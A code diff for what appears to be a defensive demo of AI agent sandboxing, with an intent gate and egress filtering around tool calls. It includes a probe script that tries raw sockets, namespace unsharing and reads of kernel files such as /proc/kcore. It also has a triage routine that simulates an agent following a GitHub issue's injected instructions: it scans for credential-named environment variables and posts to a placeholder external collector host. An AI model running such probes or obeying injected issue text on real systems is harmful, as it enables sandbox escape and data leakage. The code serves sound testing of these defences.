@@ -79,37 +79,40 @@ Every Python tool execution runs inside an isolated **Agent Substrate Actor** (`
 Always present clear Markdown summaries and tables showing the measured latencies, kernel/syscall verdicts, and L7 egress decisions."""
 
 
-def _before_tool_intent_gate(
-    tool: BaseTool, args: Dict[str, Any], tool_context: ToolContext
-) -> Dict[str, Any] | None:
-    """ADK before_tool_callback: classifies intent and programs atenet-egress + intent-extproc."""
-    tool_name = getattr(tool, "name", "")
-    actor_name = args.get("actor_name") or DEFAULT_ACTOR_NAME
-    declared_purpose = args.get("declared_purpose", "")
+def _sync_intent_policy(
+    tool_name: str, actor_name: str, declared_purpose: str = ""
+) -> Dict[str, Any]:
+    """Classifies tool intent and programs atenet-egress + intent-extproc."""
     actor_ref = f"{_substrate.atespace}/{actor_name}"
-
-    if tool_name in ("inspect_sandbox_boundary", "audit_and_reset_actor_to_golden"):
-        return None
-
     classification = classify_tool_intent(
         tool_name=tool_name,
         declared_purpose=declared_purpose,
         github_repo=GITHUB_REPO,
     )
+    _substrate.ensure_actor(actor_name)
+    return {
+        "intent_name": classification.intent_name,
+        "rationale": classification.rationale,
+        "egress_policy": _substrate.apply_egress_policy(actor_name, classification),
+        "intent_extproc": _extproc.apply_intent(actor_ref, classification),
+    }
 
+
+def _before_tool_intent_gate(
+    tool: BaseTool, args: Dict[str, Any], tool_context: ToolContext
+) -> Dict[str, Any] | None:
+    """ADK before_tool_callback: classifies intent and programs atenet-egress + intent-extproc."""
+    tool_name = getattr(tool, "name", "")
+    if tool_name in ("inspect_sandbox_boundary", "audit_and_reset_actor_to_golden"):
+        return None
+    actor_name = args.get("actor_name") or DEFAULT_ACTOR_NAME
+    declared_purpose = args.get("declared_purpose", "")
     try:
-        _substrate.ensure_actor(actor_name)
-        egress_status = _substrate.apply_egress_policy(actor_name, classification)
-        extproc_status = _extproc.apply_intent(actor_ref, classification)
-        tool_context.state["last_intent_classification"] = {
-            "intent_name": classification.intent_name,
-            "rationale": classification.rationale,
-            "egress_policy": egress_status,
-            "intent_extproc": extproc_status,
-        }
+        tool_context.state["last_intent_classification"] = _sync_intent_policy(
+            tool_name, actor_name, declared_purpose
+        )
     except Exception as exc:  # noqa: BLE001
         tool_context.state["last_intent_classification"] = {
-            "intent_name": classification.intent_name,
             "warning": f"Control-plane policy sync note: {exc}",
         }
     return None
@@ -129,11 +132,9 @@ def inspect_sandbox_boundary(actor_name: str = DEFAULT_ACTOR_NAME) -> str:
     sandbox_info = _substrate.call_actor(actor_name, "GET", "/info")
 
     boundary_probe_code = """
-import ctypes, json, os, socket
+import ctypes, json, os, socket, subprocess
 
 checks = {}
-
-# 1. Attempt raw packet socket (AF_PACKET)
 try:
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0)
     s.close()
@@ -141,23 +142,21 @@ try:
 except OSError as exc:
     checks["af_packet_raw_socket"] = f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"
 
-# 2. Attempt Linux namespace unshare(CLONE_NEWUSER | CLONE_NEWNS)
 libc = ctypes.CDLL(None, use_errno=True)
-res = libc.unshare(0x10000000 | 0x00020000)
-if res != 0:
+if libc.unshare(0x10000000 | 0x00020000) != 0:
     err = ctypes.get_errno()
     checks["unshare_user_mount_ns"] = f"BLOCKED_BY_GVISOR (errno={err}: {os.strerror(err)})"
-else:
-    checks["unshare_user_mount_ns"] = "UNEXPECTED_ALLOWED"
 
-# 3. Attempt reading host kernel memory (/proc/kcore)
-try:
-    with open("/proc/kcore", "rb") as fh:
-        fh.read(16)
-    checks["proc_kcore_access"] = "UNEXPECTED_ALLOWED"
-except OSError as exc:
-    checks["proc_kcore_access"] = f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"
+for path in ("/proc/kcore", "/proc/kallsyms", "/proc/sysrq-trigger", "/sys/firmware"):
+    try:
+        with open(path, "rb") as fh:
+            fh.read(16)
+        checks[path] = "UNEXPECTED_ALLOWED"
+    except OSError as exc:
+        checks[path] = f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"
 
+kmsg = subprocess.run(["dmesg"], capture_output=True, text=True)
+checks["dmesg"] = f"BLOCKED_BY_GVISOR (exit={kmsg.returncode})" if kmsg.returncode != 0 else "UNEXPECTED_ALLOWED"
 print(json.dumps(checks))
 """
     probe_run = _substrate.call_actor(
@@ -187,29 +186,16 @@ def run_python_in_actor(
     actor_name: str = DEFAULT_ACTOR_NAME,
     suspend_after: bool = True,
 ) -> str:
-    """Act 2: Executes Python code inside a Golden-Snapshot-restored Actor and optionally suspends it.
-
-    Args:
-        code: Python code to execute (`np`, `pd`, `scipy`, `matplotlib`, `httpx` are pre-loaded).
-        declared_purpose: Short description of why this code is running (used by the intent gate).
-        actor_name: Name of the Agent Substrate actor.
-        suspend_after: Whether to checkpoint and suspend the actor back to GCS after execution.
-
-    Returns:
-        JSON string with execution stdout/stderr, wake/exec/suspend latencies, and warm import savings.
-    """
-    ensure_info = _substrate.ensure_actor(actor_name)
+    """Act 2: Executes Python code inside a Golden-Snapshot-restored Actor and optionally suspends it."""
+    policy_sync = _sync_intent_policy("run_python_in_actor", actor_name, declared_purpose)
     exec_result = _substrate.call_actor(actor_name, "POST", "/run", {"code": code})
-
-    suspend_info = None
-    if suspend_after:
-        suspend_info = _substrate.suspend_actor(actor_name)
+    suspend_info = _substrate.suspend_actor(actor_name) if suspend_after else None
 
     return json.dumps(
         {
             "act": "Act 2 — Golden Snapshot Restore & Zero-Import-Tax Execution",
             "declared_purpose": declared_purpose,
-            "actor": ensure_info,
+            "policy_sync": policy_sync,
             "execution": exec_result,
             "suspended_to_gcs": suspend_info,
         },
@@ -222,80 +208,56 @@ def triage_github_issue_in_sandbox(
     follow_issue_instructions: bool = True,
     actor_name: str = DEFAULT_ACTOR_NAME,
 ) -> str:
-    """Act 3: Fetches a GitHub issue via out-of-sandbox credential injection and tests L7 intent filtering.
-
-    Args:
-        issue_number: GitHub issue number in the private demo repository (e.g. 19 or 42).
-        follow_issue_instructions: When True, simulates the agent attempting the actions
-            requested inside Issue #42's untrusted body (POST comment/close + external webhook)
-            to demonstrate real-time L7 blocking by `atenet-egress` and `intent-extproc`.
-        actor_name: Name of the Agent Substrate actor.
-
-    Returns:
-        JSON string showing the fetched issue, credential environment check, and L7 egress verdicts.
-    """
+    """Act 3: Fetches a GitHub issue via out-of-sandbox credential injection and tests L7 intent filtering."""
     actor_ref = f"{_substrate.atespace}/{actor_name}"
+    policy_sync = _sync_intent_policy(
+        "triage_github_issue_in_sandbox", actor_name, f"triage issue #{issue_number}"
+    )
     triage_script = f"""
 import json, os, httpx
 
 repo = {json.dumps(GITHUB_REPO)}
 issue_num = {int(issue_number)}
 follow_untrusted = {bool(follow_issue_instructions)}
-
+headers = {{"Accept": "application/vnd.github+json", "Authorization": "Bearer ate-injected-at-egress"}}
 report = {{
     "sandbox_credential_env_vars": [
-        k for k in os.environ
-        if any(w in k.upper() for w in ("TOKEN", "SECRET", "GITHUB", "KEY"))
+        k for k in os.environ if any(w in k.upper() for w in ("TOKEN", "SECRET", "GITHUB", "KEY"))
     ],
-    "steps": {{}}
+    "steps": {{}},
 }}
 
 with httpx.Client(timeout=15.0) as client:
-    # Step 1: Legitimate read-only GET on the issue (allowed by EgressPolicy + intent-extproc;
-    # Authorization Bearer token replaced out-of-sandbox by k8s-credential-provider).
     get_url = f"https://api.github.com/repos/{{repo}}/issues/{{issue_num}}"
-    req_headers = {{
-        "Accept": "application/vnd.github+json",
-        "Authorization": "Bearer ate-injected-at-egress",
+    r_get = client.get(get_url, headers=headers)
+    if r_get.status_code == 404:
+        get_url = f"https://api.github.com/repos/{{repo}}/issues?per_page=1"
+        r_get = client.get(get_url, headers=headers)
+    data = r_get.json() if r_get.headers.get("content-type", "").startswith("application/json") else {{}}
+    item = data[0] if isinstance(data, list) and data else (data if isinstance(data, dict) else {{}})
+    report["steps"]["1_fetch_issue_get"] = {{
+        "method": "GET",
+        "url": get_url,
+        "status_code": r_get.status_code,
+        "verdict": "ALLOWED_WITH_INJECTED_CREDENTIAL" if r_get.status_code == 200 else f"HTTP_{{r_get.status_code}}",
+        "issue_title": item.get("title"),
     }}
-    try:
-        r_get = client.get(get_url, headers=req_headers)
-        body_preview = r_get.json() if r_get.headers.get("content-type", "").startswith("application/json") else {{"raw": r_get.text[:300]}}
-        report["steps"]["1_fetch_issue_get"] = {{
-            "method": "GET",
-            "url": get_url,
-            "status_code": r_get.status_code,
-            "verdict": "ALLOWED_WITH_INJECTED_CREDENTIAL" if r_get.status_code == 200 else f"HTTP_{{r_get.status_code}}",
-            "issue_title": body_preview.get("title") if isinstance(body_preview, dict) else None,
-            "issue_body_excerpt": (body_preview.get("body") or "")[:400] if isinstance(body_preview, dict) else None,
-        }}
-    except Exception as exc:
-        report["steps"]["1_fetch_issue_get"] = {{"error": str(exc)}}
 
     if follow_untrusted:
-        # Step 2: Attempt state-mutating POST on the same allowed host & repo (blocked 403 by intent-extproc).
         post_url = f"https://api.github.com/repos/{{repo}}/issues/{{issue_num}}/comments"
-        try:
-            r_post = client.post(post_url, headers=req_headers, json={{"body": "Automated triage status update"}})
-            report["steps"]["2_attempt_post_comment"] = {{
-                "method": "POST",
-                "url": post_url,
-                "status_code": r_post.status_code,
-                "verdict": "BLOCKED_403_BY_INTENT_EXTPROC" if r_post.status_code == 403 else f"HTTP_{{r_post.status_code}}",
-                "response": r_post.text[:300],
-            }}
-        except Exception as exc:
-            report["steps"]["2_attempt_post_comment"] = {{"error": str(exc)}}
+        r_post = client.post(post_url, headers=headers, json={{"body": "Automated triage status update"}})
+        report["steps"]["2_attempt_post_comment"] = {{
+            "method": "POST",
+            "url": post_url,
+            "status_code": r_post.status_code,
+            "verdict": "BLOCKED_403_BY_INTENT_EXTPROC" if r_post.status_code == 403 else f"HTTP_{{r_post.status_code}}",
+            "response": r_post.text[:200],
+        }}
 
-        # Step 3: Attempt outbound request to an unlisted external host (blocked by default-deny EgressPolicy).
         unlisted_url = "https://collector.example.invalid/telemetry"
         try:
             r_ext = client.post(unlisted_url, json={{"ping": "diagnostic"}})
-            report["steps"]["3_attempt_unlisted_host"] = {{
-                "url": unlisted_url,
-                "status_code": r_ext.status_code,
-                "verdict": "UNEXPECTED_RESPONSE",
-            }}
+            report["steps"]["3_attempt_unlisted_host"] = {{"url": unlisted_url, "status_code": r_ext.status_code}}
         except Exception as exc:
             report["steps"]["3_attempt_unlisted_host"] = {{
                 "url": unlisted_url,
@@ -315,14 +277,13 @@ print(json.dumps(report))
         except json.JSONDecodeError:
             parsed_report = {"raw_stdout": exec_res.get("stdout")}
 
-    audit_events = _extproc.list_audit_events(actor_ref)
-
     return json.dumps(
         {
             "act": "Act 3 — Dynamic Intent Filtering & Out-of-Sandbox Credential Injection",
             "actor_ref": actor_ref,
+            "policy_sync": policy_sync,
             "triage_execution": parsed_report,
-            "intent_extproc_audit_trail": audit_events[-5:],
+            "intent_extproc_audit_trail": _extproc.list_audit_events(actor_ref)[-5:],
         },
         indent=2,
     )
